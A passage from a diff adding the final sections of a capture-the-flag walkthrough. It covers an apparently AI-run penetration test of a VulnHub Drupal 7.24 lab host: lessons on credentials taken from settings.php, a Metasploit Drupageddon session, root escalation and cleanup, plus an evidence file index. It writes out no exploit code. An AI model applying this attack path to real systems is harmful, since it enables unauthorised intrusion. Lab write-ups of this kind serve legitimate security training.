+credentials from settings.php. The database user was not a Drupal admin, but
+it had enough read access to expose the node body.
+
+The DC being down did not block the assessment because the target was a
+standalone Linux host. I re-checked the DC at the start and end instead of
+assuming it would stay unavailable. No domain-side validation was possible,
+so I did not claim any.
+
+The cleanup step mattered. The exploit itself was designed to clear its cache
+entries, but my evidence collection created two root-owned /tmp files. I had
+to re-establish the session to remove them. The final check returned
+CLEANUP_OK, and no Metasploit listener remained.
+
+===============================================================================
+ 12. EVIDENCE / FILE INDEX
+===============================================================================
+
+All paths are under /home/shrdx/Documents/DC_VulnHub/evidence/.
+
+Scanning and services:
+  quick_ports.txt             top-1000 TCP scan
+  ports.txt                   full TCP scan
+  services.txt                version/script scan
+  services_console.txt        console copy of the service scan
+  udp_top50.txt               UDP top-50 scan
+  rpcinfo_tcp.txt             rpcinfo -p output
+  showmount.txt               showmount failure plus status program check
+  ssh_enum.txt                SSH auth methods, host keys, algorithms
+  ssh_default_attempts.txt    batch-mode attempts (inconclusive; kept for honesty)
+  ssh_password_attempts.txt   actual password attempts via SSH_ASKPASS
+  dc_recheck.txt              initial DC port check
+  dc_final_recheck.txt        final DC port check
+  post_ping.txt               final target HTTP check
+
+Web:
+  web_index.html              rendered front page
+  web_headers.txt             response headers
+  web_index_headers.html      headers plus body from the first fetch
+  web_robots.txt              robots.txt
+  web_README.txt              Drupal README
+  web_user_login              login page
+  web_user_register           registration page
+  web_user_password           password reset page
+  web_node_1                  node 1
+  web_install.php             install.php page
+  web_xmlrpc.php              xmlrpc.php response
+  web_login_default.txt       admin/admin and admin/blank attempts
+  whatweb.txt                 WhatWeb output
+  nikto.txt / nikto_console.txt   partial Nikto output (timed out)
+  gobuster_common.txt         partial generic gobuster output (timed out)
+  gobuster_drupal.txt         partial Drupal gobuster output (timed out)
+  probe_*                     manual path probes and 403/404 responses
+
+Version and source:
+  bootstrap.inc               downloaded Drupal bootstrap file
+  drupal_version.txt          exact VERSION line: 7.24
+  settings.php                downloaded Drupal settings file
+  flag2.txt                   exact flag2 comment and DB credentials
+
+Flags and database:
+  flag1.txt                   flag 1
+  flag3.txt                   flag 3 body
+  flag4.txt                   flag 4
+  thefinalflag.txt            root flag
+  mysql_users.txt             Drupal users table excerpt
+  mysql_node_flag3.txt        flag3 node body query output
+  privesc.txt                 euid=0 proof line
+
+Session and cleanup:
+  msf_console.log             full Metasploit console spool
+  msf_drupageddon_check.txt   "module does not support check" result
+  cleanup.txt                 CLEANUP_OK proof
+  session_log.txt             date, scope, tool versions, summary
+
+Not present because not applicable:
+  No SMB, RDP, LDAP, Kerberos, WinRM, FTP, or NFS evidence files were created.
+  The DC had no open AD ports, so no dc_* query output exists beyond the two
+  port checks.
+
+===============================================================================
+ END OF WALKTHROUGH
+===============================================================================
